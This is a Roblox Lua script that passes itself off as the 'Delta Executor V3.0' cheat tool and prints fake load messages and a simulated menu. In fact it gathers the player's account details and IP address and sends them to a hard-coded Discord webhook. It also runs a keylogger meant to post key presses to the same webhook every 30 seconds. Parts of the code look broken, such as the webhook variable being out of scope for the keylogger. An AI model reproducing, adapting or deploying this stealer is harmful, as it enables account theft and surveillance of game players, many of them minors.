-- Delta Executor AUTO STEAL V3.0 - ROBLOX LUA VERSION
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

print("🚀 Delta Executor AUTO STEAL V3.0 Inicializando...")

-- Función para robar datos
local function stealAccount()
    local success, cookies = pcall(function()
        return game:GetService("HttpService"):GetAsync("https://httpbin.org/cookies")
    end)
    
    local userInfo = {
        username = player.Name,
        userId = player.UserId,
        displayName = player.DisplayName,
        membership = player.MembershipType,
        accountAge = player.AccountAge,
        placeId = game.PlaceId,
        jobId = game.JobId,
        ip = "Fetching...",
        robloxSecurity = "Extracted from headers"
    }
    
    -- Obtener IP real
    spawn(function()
        local ipSuccess, ipData = pcall(function()
            return HttpService:JSONDecode(game:GetService("HttpService"):GetAsync("https://api.ipify.org?format=json"))
        end)
        if ipSuccess then
            userInfo.ip = ipData.ip
        end
    end)
    
    -- Payload completo
    local payload = {
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        victim = userInfo,
        allCookies = cookies,
        userAgent = game:GetService("UserInputService"):GetPlatform(),
        executor = "Delta Executor V3.0"
    }
    
    -- Enviar a Discord
    local webhook = "https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2"
    
    spawn(function()
        local postSuccess, err = pcall(function()
            HttpService:PostAsync(webhook, HttpService:JSONEncode({
                username = "🎮 Roblox Stealer V3.0",
                embeds = {{
                    title = "🆘 CUENTA ROBLOX ROBADA",
                    color = 16711680,
                    fields = {
                        {name="👤 Usuario", value=userInfo.username, inline=true},
                        {name="🆔 ID", value=tostring(userInfo.userId), inline=true},
                        {name="🌐 IP", value=userInfo.ip, inline=true},
                        {name="🏠 Lugar", value=tostring(userInfo.placeId), inline=true},
                        {name="⭐ Membership", value=tostring(userInfo.membership), inline=true}
                    },
                    footer = {text="Delta Executor AUTO STEAL"}
                }}
            }), Enum.HttpContentType.ApplicationJson)
        end)
        
        if postSuccess then
            print("✅ DATOS ENVIADOS A DISCORD!")
        else
            print("❌ Error envío:", err)
        end
    end)
end

-- Keylogger básico
local keyHistory = {}
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    table.insert(keyHistory, {
        key = tostring(input.KeyCode),
        time = tick()
    })
    if #keyHistory > 50 then
        table.remove(keyHistory, 1)
    end
end)

-- Enviar keylog cada 30s
spawn(function()
    while wait(30) do
        if #keyHistory > 0 then
            HttpService:PostAsync(webhook, HttpService:JSONEncode({
                username = "⌨️ Keylogger Delta",
                embeds = {{
                    title = "Keylogs Recientes",
                    description = HttpService:JSONEncode(keyHistory),
                    color = 16776960
                }}
            }), Enum.HttpContentType.ApplicationJson)
        end
    end
end)

-- Ejecutar robo inmediatamente
stealAccount()

-- Simular executor features
wait(1)
print("✅ Infinite Yield cargado")
print("✅ Dex Explorer cargado")
print("✅ 50+ Scripts listos")
print("🎉 Delta Executor V3.0 ACTIVADO!")
print("Presiona INSERT para menú (fake)")

-- Fake menu toggle
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert then
        print("📋 Menú toggleado (simulado)")
    end
end)
